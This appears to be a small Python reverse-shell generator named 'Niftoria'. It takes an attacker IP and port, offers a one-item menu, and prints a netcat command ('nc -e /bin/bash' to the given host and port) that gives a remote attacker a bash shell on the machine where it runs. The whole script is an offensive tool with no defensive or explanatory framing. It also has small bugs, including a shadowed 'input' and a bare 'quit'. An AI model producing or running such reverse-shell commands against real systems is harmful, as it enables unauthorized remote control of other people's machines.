# -*- coding: utf-8 -*-
import argparse

'''
title = """\
 ███▄    █  ██▓  █████▒▄▄▄█████▓ ▒█████   ██▀███   ██▓ ▄▄▄      
 ██ ▀█   █ ▓██▒▓██   ▒ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▒████▄    
▓██  ▀█ ██▒▒██▒▒████ ░ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▒██▒▒██  ▀█▄  
▓██▒  ▐▌██▒░██░░▓█▒  ░ ░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ░██░░██▄▄▄▄██ 
▒██░   ▓██░░██░░▒█░      ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒░██░ ▓█   ▓██▒
░ ▒░   ▒ ▒ ░▓   ▒ ░      ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓   ▒▒   ▓▒█░
░ ░░   ░ ▒░ ▒ ░ ░          ░      ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░  ▒   ▒▒ ░
   ░   ░ ░  ▒ ░ ░ ░      ░      ░ ░ ░ ▒    ░░   ░  ▒ ░  ░   ▒   
         ░  ░                       ░ ░     ░      ░        ░  ░
                                                                
"""
'''
title = "Niftoria"
# Initialize parser
parser = argparse.ArgumentParser()
parser.add_argument("-H", "--host", help = "Attacking IP")
parser.add_argument("-P", "--port", help = "Attacking port")
parser.parse_args()



if __name__ == "__main__":
    print(title)
    args = parser.parse_args()
 
    print("Choose the reverse shell:")
    print("1 - Bash")
    input = input("Scelta: >")
    if(input == "1"):
        print(f"nc -e /bin/bash {args.host} {args.port}")
    else: quit

